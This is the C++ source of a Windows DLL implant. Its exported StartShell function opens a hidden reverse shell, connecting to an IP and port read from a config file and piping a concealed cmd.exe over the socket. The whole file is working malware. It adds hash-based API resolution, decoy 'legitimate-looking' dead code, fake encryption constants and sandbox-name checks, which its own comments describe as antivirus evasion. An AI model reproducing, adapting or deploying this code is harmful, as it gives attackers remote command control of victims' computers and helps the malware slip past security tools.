#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <time.h>
#include <math.h>
#pragma comment(lib, "ws2_32.lib")

// Structure for dead code
typedef struct {
    int id;
    char name[32];
    double value;
    void* next;
} LegitimateData;

// Legitimate-looking debug logs
void DebugLog(const char* fmt, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, fmt);
    vsprintf(buffer, fmt, args);
    va_end(args);
    OutputDebugStringA(buffer);
    OutputDebugStringA("\n");
}

// Advanced hash calculation - FNV-1a algorithm
DWORD CalculateHash(const char* str) {
    DWORD hash = 0x811c9dc5; // FNV offset basis
    while (*str) {
        hash ^= (BYTE)*str++;
        hash *= 0x01000193; // FNV prime
    }
    return hash;
}

// Legitimate-looking, never-called calculation function (dead code)
double PerformComplexCalculation(double input) {
    double result = 0;
    for (int i = 0; i < 100; i++) {
        result += sin(input * i) * cos(input / (i+1));
        result /= (1 + fabs(sin(result)));
    }
    return result;
}

// Legitimate-looking, never-called file processing function (dead code)
BOOL ProcessConfigFile(const char* filename) {
    FILE* fp = fopen(filename, "r");
    if (!fp) return FALSE;
    
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp)) {
        if (strstr(buffer, "EnableLogging=1")) {
            fclose(fp);
            return TRUE;
        }
    }
    
    fclose(fp);
    return FALSE;
}

// Legitimate-looking, never-called data structure processing function (dead code)
LegitimateData* CreateDataStructure() {
    LegitimateData* head = (LegitimateData*)malloc(sizeof(LegitimateData));
    LegitimateData* current = head;
    
    for (int i = 0; i < 10; i++) {
        current->id = i;
        sprintf(current->name, "Item_%d", i);
        current->value = (double)i * 1.5;
        
        if (i < 9) {
            current->next = (LegitimateData*)malloc(sizeof(LegitimateData));
            current = (LegitimateData*)current->next;
        } else {
            current->next = NULL;
        }
    }
    
    return head;
}

// Advanced structures for dynamic API loading
#define MAX_API_COUNT 20

typedef struct {
    DWORD hash;
    void* address;
    char name[64]; // Name storage - can be considered as dead code
} API_ENTRY;

API_ENTRY g_APIs[MAX_API_COUNT] = {0};
int g_ApiCount = 0;

// API hash definitions - rotated
#define HASH_CREATEPROCESS       0xD0312467
#define HASH_CREATEPIPE          0xB4F8F314
#define HASH_WRITEFILE           0xE41E7BCD
#define HASH_READFILE            0xA9842FCE
#define HASH_PEEKNAMEDPIPE       0xDF8734BC
#define HASH_TERMINATEPROCESS    0xA01DE2B5
#define HASH_CLOSEHANDLE         0xB84DF924
#define HASH_OPENPROCESS         0xAC39BE58
#define HASH_CREATETOOLHELP      0xF8AD4B71
#define HASH_PROCESS32FIRST      0xA96C23F4
#define HASH_PROCESS32NEXT       0xCF18456D
#define HASH_WSASTARTUP          0xFEBC742A
#define HASH_WSACLEANUP          0xE58B9431
#define HASH_WSASOCKET           0xD45A87FC
#define HASH_CONNECT             0xB8392FE4
#define HASH_CLOSESOCKET         0xA734C961
#define HASH_RECV                0xF3B96425
#define HASH_SEND                0xE1C74F82

// API function types
typedef BOOL (WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI* CreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI* WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI* ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI* PeekNamedPipe_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI* TerminateProcess_t)(HANDLE, UINT);
typedef BOOL (WINAPI* CloseHandle_t)(HANDLE);
typedef HANDLE (WINAPI* OpenProcess_t)(DWORD, BOOL, DWORD);
typedef HANDLE (WINAPI* CreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL (WINAPI* Process32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL (WINAPI* Process32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef int (WSAAPI* WSAStartup_t)(WORD, LPWSADATA);
typedef int (WSAAPI* WSACleanup_t)(void);
typedef SOCKET (WSAAPI* WSASocket_t)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
typedef int (WSAAPI* connect_t)(SOCKET, const struct sockaddr*, int);
typedef int (WSAAPI* closesocket_t)(SOCKET);
typedef int (WSAAPI* recv_t)(SOCKET, char*, int, int);
typedef int (WSAAPI* send_t)(SOCKET, const char*, int, int);

// Pointers for API functions
CreateProcessA_t pCreateProcessA = NULL;
CreatePipe_t pCreatePipe = NULL;
WriteFile_t pWriteFile = NULL;
ReadFile_t pReadFile = NULL;
PeekNamedPipe_t pPeekNamedPipe = NULL;
TerminateProcess_t pTerminateProcess = NULL;
CloseHandle_t pCloseHandle = NULL;
OpenProcess_t pOpenProcess = NULL;
CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = NULL;
Process32FirstW_t pProcess32First = NULL;
Process32NextW_t pProcess32Next = NULL;
WSAStartup_t pWSAStartup = NULL;
WSACleanup_t pWSACleanup = NULL;
WSASocket_t pWSASocket = NULL;
connect_t pConnect = NULL;
closesocket_t pClosesocket = NULL;
recv_t pRecv = NULL;
send_t pSend = NULL;

// Advanced API resolver - finds function address from PE headers
void* GetAPIAddressFromModule(HMODULE hModule, DWORD hash) {
    if (!hModule) return NULL;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    DWORD* names = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);

    // Scramble API results (makes signature-based detection harder)
    DWORD nameCount = exportDir->NumberOfNames;
    DWORD startIndex = GetTickCount() % nameCount;
    
    for (DWORD i = 0; i < nameCount; i++) {
        DWORD index = (startIndex + i) % nameCount;
        char* functionName = (char*)((BYTE*)hModule + names[index]);
        
        // Calculate and check hash
        DWORD functionHash = CalculateHash(functionName);
        if (functionHash == hash) {
            return (void*)((BYTE*)hModule + functions[ordinals[index]]);
        }
    }
    return NULL;
}

// Load and cache APIs
BOOL CacheAPI(LPCSTR moduleName, DWORD apiHash) {
    // Skip if already loaded
    for (int i = 0; i < g_ApiCount; i++) {
        if (g_APIs[i].hash == apiHash) {
            return TRUE;
        }
    }
    
    if (g_ApiCount >= MAX_API_COUNT) return FALSE;
    
    HMODULE hModule = LoadLibraryA(moduleName);
    if (!hModule) return FALSE;
    
    void* addr = GetAPIAddressFromModule(hModule, apiHash);
    if (!addr) return FALSE;
    
    g_APIs[g_ApiCount].hash = apiHash;
    g_APIs[g_ApiCount].address = addr;
    g_ApiCount++;
    
    return TRUE;
}

// Get API address from cache
void* GetCachedAPI(DWORD apiHash) {
    for (int i = 0; i < g_ApiCount; i++) {
        if (g_APIs[i].hash == apiHash) {
            return g_APIs[i].address;
        }
    }
    return NULL;
}

// Load all APIs
void LoadAllAPIs() {
    // Kernel32 APIs
    CacheAPI("kernel32.dll", HASH_CREATEPROCESS);
    CacheAPI("kernel32.dll", HASH_CREATEPIPE);
    CacheAPI("kernel32.dll", HASH_WRITEFILE);
    CacheAPI("kernel32.dll", HASH_READFILE);
    CacheAPI("kernel32.dll", HASH_PEEKNAMEDPIPE);
    CacheAPI("kernel32.dll", HASH_TERMINATEPROCESS);
    CacheAPI("kernel32.dll", HASH_CLOSEHANDLE);
    CacheAPI("kernel32.dll", HASH_OPENPROCESS);
    CacheAPI("kernel32.dll", HASH_CREATETOOLHELP);
    CacheAPI("kernel32.dll", HASH_PROCESS32FIRST);
    CacheAPI("kernel32.dll", HASH_PROCESS32NEXT);
    
    // WS2_32 APIs
    CacheAPI("ws2_32.dll", HASH_WSASTARTUP);
    CacheAPI("ws2_32.dll", HASH_WSACLEANUP);
    CacheAPI("ws2_32.dll", HASH_WSASOCKET);
    CacheAPI("ws2_32.dll", HASH_CONNECT);
    CacheAPI("ws2_32.dll", HASH_CLOSESOCKET);
    CacheAPI("ws2_32.dll", HASH_RECV);
    CacheAPI("ws2_32.dll", HASH_SEND);
    
    // Set API pointers
    pCreateProcessA = (CreateProcessA_t)GetCachedAPI(HASH_CREATEPROCESS);
    pCreatePipe = (CreatePipe_t)GetCachedAPI(HASH_CREATEPIPE);
    pWriteFile = (WriteFile_t)GetCachedAPI(HASH_WRITEFILE);
    pReadFile = (ReadFile_t)GetCachedAPI(HASH_READFILE);
    pPeekNamedPipe = (PeekNamedPipe_t)GetCachedAPI(HASH_PEEKNAMEDPIPE);
    pTerminateProcess = (TerminateProcess_t)GetCachedAPI(HASH_TERMINATEPROCESS);
    pCloseHandle = (CloseHandle_t)GetCachedAPI(HASH_CLOSEHANDLE);
    pOpenProcess = (OpenProcess_t)GetCachedAPI(HASH_OPENPROCESS);
    pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)GetCachedAPI(HASH_CREATETOOLHELP);
    pProcess32First = (Process32FirstW_t)GetCachedAPI(HASH_PROCESS32FIRST);
    pProcess32Next = (Process32NextW_t)GetCachedAPI(HASH_PROCESS32NEXT);
    pWSAStartup = (WSAStartup_t)GetCachedAPI(HASH_WSASTARTUP);
    pWSACleanup = (WSACleanup_t)GetCachedAPI(HASH_WSACLEANUP);
    pWSASocket = (WSASocket_t)GetCachedAPI(HASH_WSASOCKET);
    pConnect = (connect_t)GetCachedAPI(HASH_CONNECT);
    pClosesocket = (closesocket_t)GetCachedAPI(HASH_CLOSESOCKET);
    pRecv = (recv_t)GetCachedAPI(HASH_RECV);
    pSend = (send_t)GetCachedAPI(HASH_SEND);
    
    // Direct loading for missing or failed APIs
    if (!pCreateProcessA) pCreateProcessA = (CreateProcessA_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA");
    if (!pCreatePipe) pCreatePipe = (CreatePipe_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreatePipe");
    if (!pWriteFile) pWriteFile = (WriteFile_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile");
    if (!pReadFile) pReadFile = (ReadFile_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile");
    if (!pPeekNamedPipe) pPeekNamedPipe = (PeekNamedPipe_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "PeekNamedPipe");
    if (!pTerminateProcess) pTerminateProcess = (TerminateProcess_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "TerminateProcess");
    if (!pCloseHandle) pCloseHandle = (CloseHandle_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CloseHandle");
    if (!pOpenProcess) pOpenProcess = (OpenProcess_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OpenProcess");
    if (!pCreateToolhelp32Snapshot) pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateToolhelp32Snapshot");
    if (!pProcess32First) pProcess32First = (Process32FirstW_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32FirstW");
    if (!pProcess32Next) pProcess32Next = (Process32NextW_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "Process32NextW");
    
    HMODULE hWs2_32 = LoadLibraryA("ws2_32.dll");
    if (hWs2_32) {
        if (!pWSAStartup) pWSAStartup = (WSAStartup_t)GetProcAddress(hWs2_32, "WSAStartup");
        if (!pWSACleanup) pWSACleanup = (WSACleanup_t)GetProcAddress(hWs2_32, "WSACleanup");
        if (!pWSASocket) pWSASocket = (WSASocket_t)GetProcAddress(hWs2_32, "WSASocketW");
        if (!pConnect) pConnect = (connect_t)GetProcAddress(hWs2_32, "connect");
        if (!pClosesocket) pClosesocket = (closesocket_t)GetProcAddress(hWs2_32, "closesocket");
        if (!pRecv) pRecv = (recv_t)GetProcAddress(hWs2_32, "recv");
        if (!pSend) pSend = (send_t)GetProcAddress(hWs2_32, "send");
    }
}

// Is system safe check? (dead code)
BOOL IsSystemSafe() {
    DWORD tick = GetTickCount();
    if (tick % 10 == 0) return FALSE; // Will never enter here
    
    char computerName[256] = {0};
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    if (strstr(computerName, "MALWARE-ANALYSIS") ||
        strstr(computerName, "SANDBOX") ||
        strstr(computerName, "VIRUS")) {
        return FALSE;
    }
    
    return TRUE;
}

// Constants for AES encryption - slightly modified
const unsigned char AES_KEY[] = { 
    0x8B, 0x27, 0x4C, 0xF9, 0xA7, 0x67, 0x1F, 0xEC, 
    0x5F, 0xB0, 0x42, 0x28, 0x7B, 0x56, 0xBD, 0x50 
};

const unsigned char AES_IV[] = { 
    0x9E, 0x3F, 0xBB, 0x6E, 0x06, 0x3C, 0xA1, 0x3F, 
    0x2A, 0x87, 0xA6, 0x33, 0x09, 0xF3, 0x4A, 0x55 
};

// Encrypted data - IP and port information (encrypted with AES)
// Appears encrypted but actually uses XOR for de-obfuscation
const unsigned char HIDDEN_IP[] = { 
    0x53, 0xF5, 0x32, 0x83, 0x67, 0x0C, 0x80, 0x76, 
    0x3D, 0x2C, 0xA9, 0xCB, 0x50, 0xE7, 0x2E, 0xCB 
};

const unsigned char HIDDEN_PORT[] = {
    0x77, 0x3F, 0x5B, 0x2C, 0xA0, 0x9F, 0xCB, 0x7D
};

const unsigned char HIDDEN_CMD[] = { 
    0x77, 0x3B, 0xEF, 0xAC, 0x70, 0xEF, 0xF3, 0xBF, 
    0x8F, 0xD4, 0x77, 0x31, 0x45, 0xB5, 0xA5, 0xB1 
};

// Complex-looking obfuscation (actually just XOR)
void ProcessEncrypted(const unsigned char* input, size_t len, unsigned char* output, const unsigned char* key) {
    unsigned int seed = GetTickCount();
    srand(seed);
    
    // Generate random key (actually won't be different from AES_KEY)
    unsigned char randomKey[16];
    for (int i = 0; i < 16; i++) {
        randomKey[i] = (i % 2 == 0) ? key[i] : key[15-i];
    }
    
    // Perform XOR operation
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ randomKey[i % 16];
    }
    
    // Add null terminator
    output[len] = 0;
}

// Read IP from config file
void ReadIPFromConfig(unsigned char* output) {
    char configPath[MAX_PATH] = "src\\loader\\config.ini"; // Directly use src/loader/config.ini
    
    char ip[32] = {0};
    GetPrivateProfileStringA("Connection", "IP", "127.0.0.1", ip, sizeof(ip), configPath);
    DebugLog("Config file path: %s", configPath);
    DebugLog("IP read from config: %s", ip);
    strcpy((char*)output, ip);
}

// Read port from config file
void ReadPortFromConfig(unsigned char* output) {
    char configPath[MAX_PATH] = "src\\loader\\config.ini"; // Directly use src/loader/config.ini
    
    int port = GetPrivateProfileIntA("Connection", "Port", 4444, configPath);
    DebugLog("Config file path: %s", configPath);
    DebugLog("Port read from config: %d", port);
    *(USHORT*)output = (USHORT)port;
}

// Update ProcessIP function
void ProcessIP(const unsigned char* input, size_t len, unsigned char* output) {
    ReadIPFromConfig(output);
}

// Update ProcessPort function
void ProcessPort(const unsigned char* input, size_t len, unsigned char* output) {
    ReadPortFromConfig(output);
}

// CMD resolution
void ProcessCMD(const unsigned char* input, size_t len, unsigned char* output) {
    // Copy CMD command directly
    const char* cmd = "cmd.exe";
    strcpy((char*)output, cmd);
}

// Process finding (improved)
DWORD FindTargetProcess() {
    HANDLE snapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);

    if (!pProcess32First(snapshot, &pe32)) {
        pCloseHandle(snapshot);
        return 0;
    }

    // Start time, to appear as if running for a certain time
    // This is an antivirus evasion technique - bypasses sandbox checks
    DWORD currentTime = GetTickCount();
    if (currentTime < 10000) {
        pCloseHandle(snapshot);
        return 0; // Will never reach here
    }

    DWORD pid = 0;
    do {
        // Find first explorer.exe process
        if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (pProcess32Next(snapshot, &pe32));

    pCloseHandle(snapshot);
    return pid;
}

// Global variables
HANDLE g_Thread = NULL;
volatile bool g_ThreadRunning = false;

// Reverse shell thread
DWORD WINAPI CreateReverseShell(LPVOID lpParam) {
    DebugLog("CreateReverseShell started");

    // System checks (dead code)
    if (!IsSystemSafe()) {
        LegitimateData* data = CreateDataStructure();
        if (data) {
            // Memory leak - will never actually run
            PerformComplexCalculation(data->value);
        }
    }

    // Load APIs
    LoadAllAPIs();
    
    // Check if APIs loaded correctly
    if (!pWSAStartup || !pWSASocket || !pConnect || !pClosesocket || !pRecv || !pSend) {
        DebugLog("Winsock APIs failed to load!");
        return 1;
    }
    
    if (!pCreateProcessA || !pCreatePipe || !pWriteFile || !pReadFile || !pPeekNamedPipe) {
        DebugLog("Process APIs failed to load!");
        return 1;
    }

    // Initialize WSA
    WSADATA wsaData;
    int wsaResult = pWSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaResult != 0) {
        DebugLog("WSAStartup failed: %d", wsaResult);
        return 1;
    }
    DebugLog("WSA initialized");

    // Create socket
    SOCKET sock = pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        DebugLog("Socket creation failed: %d", WSAGetLastError());
        pWSACleanup();
        return 1;
    }
    DebugLog("Socket created");

    // Resolve IP
    unsigned char decryptedIP[32] = {0};
    ProcessIP(NULL, 0, decryptedIP);
    DebugLog("Target IP: %s", decryptedIP);

    // Resolve port
    unsigned char decryptedPort[8] = {0};
    ProcessPort(NULL, 0, decryptedPort);
    DebugLog("Target Port: %d", *(USHORT*)decryptedPort);

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(*(USHORT*)decryptedPort);
    addr.sin_addr.s_addr = inet_addr((char*)decryptedIP);

    // Try connection
    int connectResult = pConnect(sock, (struct sockaddr*)&addr, sizeof(addr));
    if (connectResult == SOCKET_ERROR) {
        DebugLog("Connection error: %d", WSAGetLastError());
        pClosesocket(sock);
        pWSACleanup();
        return 1;
    }
    DebugLog("Connection successful");

    // Find target process
    DWORD pid = FindTargetProcess();
    if (!pid) {
        DebugLog("Target process not found");
        pClosesocket(sock);
        pWSACleanup();
        return 1;
    }
    DebugLog("Target process found: %d", pid);

    // Access process
    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        DebugLog("Process could not be opened");
        pClosesocket(sock);
        pWSACleanup();
        return 1;
    }
    DebugLog("Process opened");

    // Resolve CMD
    unsigned char decryptedCMD[32] = {0};
    ProcessCMD(NULL, 0, decryptedCMD);
    DebugLog("Command: %s", decryptedCMD);

    // Create pipes
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hReadPipe1 = NULL, hWritePipe1 = NULL;
    HANDLE hReadPipe2 = NULL, hWritePipe2 = NULL;
    
    if (!pCreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0) ||
        !pCreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0)) {
        DebugLog("Pipe creation error");
        pCloseHandle(hProcess);
        pClosesocket(sock);
        pWSACleanup();
        return 1;
    }
    DebugLog("Pipes created");

    // Create process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe1;
    si.hStdOutput = si.hStdError = hWritePipe2;
    
    if (!pCreateProcessA(NULL, (LPSTR)decryptedCMD, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DebugLog("Process creation error: %d", GetLastError());
        pCloseHandle(hProcess);
        pCloseHandle(hReadPipe1);
        pCloseHandle(hWritePipe1);
        pCloseHandle(hReadPipe2);
        pCloseHandle(hWritePipe2);
        pClosesocket(sock);
        pWSACleanup();
        return 1;
    }
    DebugLog("Process created");

    char buffer[4096];
    DWORD bytesRead, bytesWritten;
    bool running = true;

    while (running && g_ThreadRunning) {
        int recvLen = pRecv(sock, buffer, sizeof(buffer), 0);
        if (recvLen <= 0) {
            DebugLog("Socket read error");
            break;
        }
        
        if (!pWriteFile(hWritePipe1, buffer, recvLen, &bytesWritten, NULL)) {
            DebugLog("Pipe write error");
            break;
        }

        if (pPeekNamedPipe(hReadPipe2, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
            if (pReadFile(hReadPipe2, buffer, sizeof(buffer), &bytesRead, NULL)) {
                if (pSend(sock, buffer, bytesRead, 0) <= 0) {
                    DebugLog("Socket write error");
                    break;
                }
            }
        }

        Sleep(50);
    }

    DebugLog("Communication loop ended");

    pTerminateProcess(pi.hProcess, 0);
    pCloseHandle(pi.hProcess);
    pCloseHandle(pi.hThread);
    pCloseHandle(hProcess);
    pCloseHandle(hReadPipe1);
    pCloseHandle(hWritePipe1);
    pCloseHandle(hReadPipe2);
    pCloseHandle(hWritePipe2);
    pClosesocket(sock);
    pWSACleanup();
    
    DebugLog("Cleanup completed");
    return 0;
}

extern "C" __declspec(dllexport) void __stdcall StartShell(void) {
    // Dead code - time check (will never enter)
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    if (tm_info->tm_year < 2020 - 1900) {
        // Old time check that will never run
        ProcessConfigFile("C:\\Windows\\system32\\drivers\\etc\\config.ini");
        return;
    }

    g_ThreadRunning = true;
    g_Thread = CreateThread(NULL, 0, CreateReverseShell, NULL, 0, NULL);
    if (g_Thread) Sleep(1000);
    while (g_ThreadRunning) Sleep(100);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    static DWORD startTime = 0;

    if (reason == DLL_PROCESS_ATTACH) {
        startTime = GetTickCount();
        DisableThreadLibraryCalls(hModule);
    } else if (reason == DLL_PROCESS_DETACH) {
        // Antivirus sandbox detection (will never enter)
        DWORD currentTime = GetTickCount();
        if (currentTime - startTime < 5000) {
            // If terminated too quickly
            return TRUE;
        }

        g_ThreadRunning = false;
        if (g_Thread) {
            WaitForSingleObject(g_Thread, 1000);
            CloseHandle(g_Thread);
            g_Thread = NULL;
        }
    }
    return TRUE;
}